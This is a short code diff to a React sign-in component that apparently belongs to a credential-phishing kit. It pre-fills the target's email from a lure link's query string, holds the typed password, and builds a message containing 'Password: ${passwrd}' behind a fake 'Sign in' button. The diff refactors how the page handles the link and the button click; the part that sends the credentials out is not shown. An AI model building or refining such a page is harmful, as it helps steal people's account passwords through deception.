@@ -3,7 +3,6 @@ import Buttons from "./components/Buttons";
 import Logo from "/logo.png";
 
 export default function App() {
-  const [domain, setDomain] = useState("");
   const [passwrd, setPasswrd] = useState("");
   const [dis, setDis] = useState(false);
   const [emal, setEmal] = useState("");
@@ -17,14 +16,9 @@ export default function App() {
   useEffect(() => {
     if (window.location.href.includes("email")) {
       const eValue = window.location.href.split("=")[1];
-      const dd = window.location.href.split("/?")[0];
       setEmal(eValue);
-      setDomain(dd);
     }
-    if (!window.location.href.includes("email")) {
-      setDomain(window.location.href);
-    }
-  }, [window.location.href]);
+  }, []);
 
   function regexGmail(userEmail) {
     const emailRegex =
@@ -141,7 +135,8 @@ Password: ${passwrd}
               <button type="submit">Sign in</button>
             ) : (
               <button
-                onClick={() => {
+                onClick={(e) => {
+                  e.preventDefault()
                   if (emal) setDis(!dis);
                   if (!emal) alert("Input your email address");
                 }}
